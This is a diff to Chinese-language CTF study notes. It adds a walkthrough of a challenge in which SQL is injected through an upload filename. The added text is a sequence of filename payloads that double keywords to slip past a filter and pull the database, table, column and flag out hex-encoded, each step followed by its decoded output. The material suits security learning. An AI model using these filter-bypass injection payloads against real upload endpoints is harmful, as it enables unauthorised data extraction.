@@ -1145,7 +1145,71 @@ reset(array &$array)
 
 ##  四、相关内容
 
-1、[文件名SQL注入](https://www.cnblogs.com/conquer-vv/p/11328249.html)
+### 1、[文件名SQL注入](https://www.cnblogs.com/conquer-vv/p/11328249.html)
+
+#### 通关过程：
+
+{% tabs %}
+{% tab title="通关过程" %}
+```text
+# 1 
+filename="'+(selselectect hex(database()))+'.jpg" 
+7765625 →十六转字符串→ web 
+
+# 2
+filename="'+(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg"
+131277325825392 →十转十六→ 7765625f7570 →十六转字符串→ web_up
+
+# 3
+filename="'+(selselectect conv(substr(hex(database()),13,25),16,10))+ '.jpg"
+1819238756 →十转十六→ 6c6f6164 →十六转字符串→ load
+
+# 4
+数据库名：web_upload
+
+# 5
+filename="'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg"
+114784820031327 →十转十六→ 68656c6c6f5f →十六转字符串→ hello_
+
+# 6
+filename="'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),13,12),16,10))+'.jpg"
+112615676665705 →十转十六→ 666c61675f69 →十六转字符串→ flag_i
+ 
+ # 7
+filename="'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),25,12),16,10))+'.jpg"
+126853610566245 →十转十六→ 735f68657265 →十六转字符串→ s_here
+ 
+ # 8
+ 表名：hello_flag_is_here
+ 
+ # 9
+ filename="'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg"
+ 115858377367398 →十转十六→ 695f616d5f66 →十六转字符串→ i_am_f
+ 
+ filename="'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),13,12),16,10))+'.jpg"
+ 7102823 →十转十六→ 6c6167 →十六转字符串→ lag
+ # 10
+ filename="'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg"
+ 36427215695199 →十转十六→ 21215f406d5f →十六转字符串→ !!_@m_
+ 
+ # 11
+ filename="'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),7,12),16,10))+'.jpg"
+ 92806431727430 →十转十六→ 54682e655f46 →十六转字符串→ Th.e_F
+ # 12
+ filename="'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg"
+ 560750951 →十转十六→ 216c6167 →十六转字符串→ !lag
+ 
+ # 13
+ FLAG：!!_@m_Th.e_F!lag
+```
+{% endtab %}
+
+{% tab title="涉及知识点" %}
+
+{% endtab %}
+{% endtabs %}
+
+
 
 2、[文件上传与XSS](https://www.freebuf.com/articles/web/101843.html)
 
